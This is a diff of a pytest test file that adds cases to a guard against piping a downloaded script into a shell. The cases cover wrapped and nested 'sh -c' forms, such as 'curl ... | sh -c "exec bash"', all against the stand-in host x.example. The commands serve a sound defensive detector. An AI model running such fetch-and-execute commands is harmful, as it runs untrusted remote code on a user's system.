@@ -553,6 +553,22 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         pytest.param(
             "RUN curl -sSL https://x.example/i.sh | bash -s -c 'jq .'\n", id="dash-s-beats-dash-c"
         ),
+        # A MULTI-WORD `-c` body. The operand is re-tokenized and walked like any other stage, so
+        # the shell is found behind whatever precedes it -- judging the body by its first word
+        # would miss every one of these.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | sh -c 'exec bash'\n", id="dash-c-body-exec"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | sh -c 'env bash'\n", id="dash-c-body-wrapper"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | sh -c 'busybox ash'\n", id="dash-c-body-busybox"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | sh -c 'timeout 30 sh'\n",
+            id="dash-c-body-numeric-operand",
+        ),
         # A shell option that takes its own operand. Scanning LEFT from the `-c` stopped at
         # `pipefail` and concluded the command was not a shell, so the quoted pipeline stayed
         # closed -- and `-o pipefail` is exactly how a careful CI script opens.
@@ -722,6 +738,12 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         # BusyBox dispatches non-shell applets too; stepping over the wrapper must not make the
         # applet after it match.
         pytest.param("curl -s https://x.example/f | busybox cat", id="busybox-non-shell-applet"),
+        # The other direction for a multi-word `-c` body: a NESTED `-c` whose own operand runs a
+        # non-shell. The recursion has to reach the inner operand, not stop at the inner `bash`.
+        pytest.param(
+            "curl -s https://x.example/f | sh -c 'bash -c \"jq .\"'", id="nested-dash-c-runs-jq"
+        ),
+        pytest.param("curl -s https://x.example/f | sh -c 'exec jq .'", id="dash-c-body-exec-jq"),
         # A shell OPTION's operand is skipped, so a shell-named one must not read as a command.
         # `bash -o bash script.sh` sets an (invalid) option and runs a script, not a nested shell.
         pytest.param("curl -s https://x.example/f | jq -o bash .", id="option-operand-not-command"),
